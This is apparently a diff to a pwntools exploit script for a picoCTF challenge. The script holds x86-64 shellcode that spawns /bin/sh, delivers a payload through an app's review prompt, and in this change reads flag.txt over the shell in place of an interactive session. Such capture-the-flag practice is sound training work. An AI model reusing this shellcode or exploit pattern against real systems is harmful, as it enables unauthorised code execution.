@@ -4,7 +4,7 @@ from pwn import *
 context.arch = 'amd64'
 context.log_level = 'critical'
 
-p = remote('shape-facility.picoctf.net', 50924)
+p = remote('shape-facility.picoctf.net', 49983)
 
 # execute /bin/sh shellcode
 shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
@@ -30,4 +30,6 @@ p.sendlineafter(b'3. Exit the app\n', b'3')
 p.sendlineafter(b'If you could take a second to write a quick review, we would really appreciate it: \n', payload)
 
 # Access shell
-p.interactive() 
+p.sendline(b'cat flag.txt')
+flag = p.recvall(timeout=0.5).decode()
+print(flag)
